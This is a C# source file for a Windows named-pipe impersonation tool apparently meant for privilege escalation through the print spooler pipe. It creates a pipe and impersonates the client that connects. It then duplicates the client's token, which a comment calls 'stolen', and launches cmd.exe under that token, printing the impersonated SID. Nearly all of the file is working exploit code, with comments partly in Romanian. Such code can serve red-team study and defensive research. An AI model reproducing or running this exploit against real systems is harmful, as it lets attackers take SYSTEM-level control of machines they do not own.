using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;

namespace PrintSpooler
{
    internal class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateNamedPipe(
            string lpName,
            uint dwOpenMode,
            uint dwPipeMode,
            uint nMaxInstances,
            uint nOutBufferSize,
            uint nInBufferSize,
            uint nDefaultTimeOut,
            IntPtr lpSecurityAttributes
        );

        [DllImport("kernel32.dll")]
        static extern bool ConnectNamedPipe(
            IntPtr hNamedPipe,
            IntPtr lpOverlapped
        );

        [DllImport("Advapi32.dll")]
        static extern bool ImpersonateNamedPipeClient(
            IntPtr hNamedPipe
        );

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenThreadToken(
            IntPtr ThreadHandle,
            uint DesiredAccess,
            bool OpenAsSelf,
            out IntPtr TokenHandle
        );

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentThread();

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool GetTokenInformation(
            IntPtr TokenHandle,
            uint TokenInformationClass,
            IntPtr TokenInformation,
            int TokenInformationLength,
            out int ReturnLength
        );

        [DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool ConvertSidToStringSid(IntPtr pSID, out IntPtr ptrSid);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public extern static bool DuplicateTokenEx(
            IntPtr hExistingToken,
            uint dwDesiredAccess,
            IntPtr lpTokenAttributes,
            uint ImpersonationLevel,
            uint TokenType,
            out IntPtr phNewToken
        );

        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool CreateProcessWithTokenW(
            IntPtr hToken,
            LogonFlags dwLogonFlags,
            string lpApplicationName,
            string lpCommandLine,
            CreationFlags dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            [In] ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation
        );

        [StructLayout(LayoutKind.Sequential)]
        public struct SID_AND_ATTRIBUTES
        {
            public IntPtr Sid;
            public int Attributes;
        }

        public struct TOKEN_USER
        {
            public SID_AND_ATTRIBUTES User;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool RevertToSelf();

        [DllImport("kernel32.dll")]
        static extern uint GetSystemDirectory(
            [Out] StringBuilder lpBuffer,
            uint uSize
        );

        [DllImport("userenv.dll", SetLastError = true)]
        static extern bool CreateEnvironmentBlock(
            out IntPtr lpEnvironment,
            IntPtr hToken,
            bool bInherit
        );

        public enum CreationFlags
        {
            DefaultErrorMode = 0x04000000,
            NewConsole = 0x00000010,
            NewProcessGroup = 0x00000200,
            SeparateWOWVDM = 0x00000800,
            Suspended = 0x00000004,
            UnicodeEnvironment = 0x00000400,
            ExtendedStartupInfoPresent = 0x00080000
        }

        public enum LogonFlags
        {
            WithProfile = 1,
            NetCredentialsOnly
        }

        static void Main(string[] args)
        {

            if (args.Count() < 1)
            {
                Console.Write("[!] Please provide pipe name to impersonate. For SpoolerService use \"\\\\.\\pipe\\test\\pipe\\spoolss\"");
                return;
            }

            string pipeName = args[0];
            //string pipeName = "\\\\.\\pipe\\test";

            IntPtr hPipe = CreateNamedPipe(
                pipeName, // numele pipe-ului
                3, // PIPE_ACCESS_DUPLEX pentru comunicare bidirectionala
                0, // PIPE_TYPE_BYTE pentru a scrie si a citi bytes din pipe
                10, // numarul maxim de clienti acceptati
                0x1000, // numarul de bytes folositi pentru output
                0x1000, // numarul de bytes folositi pentru input
                0,
                IntPtr.Zero
            );

            if(hPipe == IntPtr.Zero)
            {
                Console.WriteLine("[!] Error creating pipe");
                return;
            }

            // this will wait for a connection to the pipe
            ConnectNamedPipe(
                hPipe, // HANDLE pipe anterior
                IntPtr.Zero
            );

            // after a connection being made, we will impersonate the pipe client
            ImpersonateNamedPipeClient(hPipe);

            IntPtr hToken;
            OpenThreadToken(
                GetCurrentThread(), // deschide un HANDLE catre thread-ul curent
                0xF01FF, // TOKEN_ALL_ACCESS
                false,
                out hToken // parametru de output, va stoca HANDLE-ul token-ului
            );

            int TokenInfLength = 0;

            GetTokenInformation(
                hToken,
                1, // valoarea a ENUM-ului _TOKEN_INFORMATION_CLASS, 1 - TokenUser (contine SID)
                IntPtr.Zero,
                TokenInfLength,
                out TokenInfLength // parametru out care va prelua dimensiunea structurii dorite
            );

            // allocate memory to get token information length
            IntPtr TokenInformation = Marshal.AllocHGlobal((IntPtr)TokenInfLength);

            GetTokenInformation(
                hToken,
                1,
                TokenInformation, // pointer catre memoria alocata anterior
                TokenInfLength,
                out TokenInfLength
            );

            TOKEN_USER TokenUser = (TOKEN_USER)Marshal.PtrToStructure(
                TokenInformation, // pointer-ul catre memorie
                typeof(TOKEN_USER) // tipul structurii dorite
            );

            // declaram un pointer pentru stocarea memoriei
            IntPtr pstr = IntPtr.Zero;
            // convertim SID-ul binar in string si salvam in pointer-ul declarat anterior
            Boolean ok = ConvertSidToStringSid(TokenUser.User.Sid, out pstr);

            // convertim pointer-ul in string managed
            string sidstr = Marshal.PtrToStringAuto(pstr);
            // afisam SID-ul
            Console.WriteLine(@"[+] Impersonated SID: {0}", sidstr);

            IntPtr hSystemToken = IntPtr.Zero;
            // we will clone the stolen token
            DuplicateTokenEx(
                hToken, // HANDLE-ul tokenului capturat anterior
                0xF01FF, // TOKEN_ALL_ACCESS
                IntPtr.Zero,
                2, // nivel de impersonare - SecurityImpersonation (vezi ENUM _SECURITY_IMPERSONATION_LEVEL)
                1, // valoarea a ENUM-ului TOKEN_TYPE, 1 - token primar
                out hSystemToken // parametru output pentru salvarea token-ului
            );

            StringBuilder sbSystemDir = new StringBuilder(256);
            uint res1 = GetSystemDirectory(sbSystemDir, 256);

            IntPtr env = IntPtr.Zero;
            bool res = CreateEnvironmentBlock(out env, hSystemToken, false);

            String name = WindowsIdentity.GetCurrent().Name;
            Console.WriteLine("Impersonated user is: " + name);

            // create a process with the cloned token
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            si.lpDesktop = "WinSta0\\Default"; // desktop default

            if (!CreateProcessWithTokenW(
                hSystemToken,
                LogonFlags.WithProfile, // incarca registrii HKEY_USERS dupa creare procesului
                null,
                "C:\\Windows\\System32\\cmd.exe",
                CreationFlags.UnicodeEnvironment, // vom folosi unicode in proces
                env, // mediul de creare al procesului
                sbSystemDir.ToString(), // directorul in care ruleaza procesul
                ref si,
                out pi
            ))
            {
                Console.WriteLine("[!] Creation of process failed. Error: " + Marshal.GetLastWin32Error());
                return;
            }

            Console.WriteLine("[+] Created process with id: " + pi.dwProcessId);
        }
    }
}
